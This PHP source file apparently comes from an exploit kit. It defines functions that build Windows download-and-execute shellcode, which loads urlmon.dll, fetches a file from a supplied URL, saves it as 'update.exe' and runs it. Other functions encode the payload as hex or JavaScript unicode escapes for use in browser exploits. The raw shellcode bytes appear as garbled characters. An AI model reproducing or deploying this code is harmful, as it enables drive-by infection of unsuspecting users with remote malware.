<?php

function uescape($s) {
	$out = '';
	$res = strtoupper( bin2hex( $s ) );
	$g = round( strlen( $res ) / 4 );

	if ($g != strlen( $res ) / 4) {
		$res .= '00';
	}

	$i = 0;

	while ($i < strlen( $res )) {
		$out .= '\u' . substr( $res, $i + 2, 2 ) . substr( $res, $i, 2 );
		$i += 4;
	}

	return $out;
}

function shellcode_dl_exec_hex($url) {
	$shellcode = str_to_hex( uescape( shellcode_dl_exec( $url ) ) );
	return $shellcode;
}

function shellcode_dl_exec_js($url) {
	$shellcode = uescape( shellcode_dl_exec( $url ) );
	return $shellcode;
}

function shellcode_dl_exec($url) {
	$shellcode = '' . 'ëB_¹ÿÿÿÿ‰þ°ÿò®þG' . 'ÿ‰û°ÿò®þGÿ‰ýò®þG' . 'ÿët`1Éd‹q0‹v‹v' . '‹^‹V ‹6f9Juò‰\' . '$aÃë^`‹l$$‹E<‹T' . 'xê‹J‹Z ëã7I‹' . '4‹î1ÿ1Àü¬„Àt
ÁÏ' . 'Çéñÿÿÿ;|$(uÞ‹Z' . '$ëf‹K‹Zë‹‹' . 'è‰D$aÃëZ1ÒRRSUR' . 'ÿÐëëcèxÿÿÿºø™?<' . 'RPèÿÿÿ1ÒRÿÐë3è`' . 'ÿÿÿºãRPèwÿÿÿ1' . 'ÒÂÿÿÿÿêúÿÿÿRSÿ' . 'ÐëÃº3^rRPèWÿÿÿë' . '¨ëZè+ÿÿÿºlC<XRPè' . 'BÿÿÿVÿÐëÚèôþÿÿur' . 'lmon.dllÿ' . 'update.exe' . 'ÿ' . $url . 'ÿÍ';
		return $shellcode;
	}

	include_once( 'util.php' );
?>
